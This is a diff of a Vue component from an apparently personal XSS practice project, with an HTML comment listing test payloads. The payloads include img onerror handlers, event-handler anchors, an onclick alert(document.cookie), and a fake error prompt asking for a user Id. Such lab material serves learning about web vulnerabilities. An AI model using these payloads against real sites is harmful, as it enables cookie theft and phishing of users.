@@ -2,6 +2,8 @@
     import {ref} from 'vue'
     const payload = ref('')
     const injectHtml = ref('')
+
+  
 </script>
 
 <template>
@@ -28,12 +30,12 @@
             <button type="submit" class="btn btn-primary mt-3">submit </button>
         </div>
     </section>
-
 </template>
 
 
-<!-- SCRIPTS XSS -->
- <!-- 
+<!-- 
+SCRIPTS XSS
+
 Fucntionning :
     HTML tags : strong, h1, h2..., input
     <input type="text" value="whatever" style="color:white; background-color:red"></input>
@@ -42,10 +44,10 @@ Fucntionning :
     <img src=whatever onerror=console.log("Error is sucess")>
     <img src/onerror=prompt('youhou')>
     <a onmouseover="alert('youhou')"\>Click me!</a>
+    <a href="https://github.com/fabienAstia/xss-vulnerabilities/tree/main">clickme</a>
+    <a onclick=alert(document.cookie) href="#">Submit</a>
 
- -->
 
- <!-- 
  Not Fucntionning:
     <script>alert('youhou')</script>
     <img src/onerror=prompt('Sorry, an error was occur. Please, enter your Id to continue')>
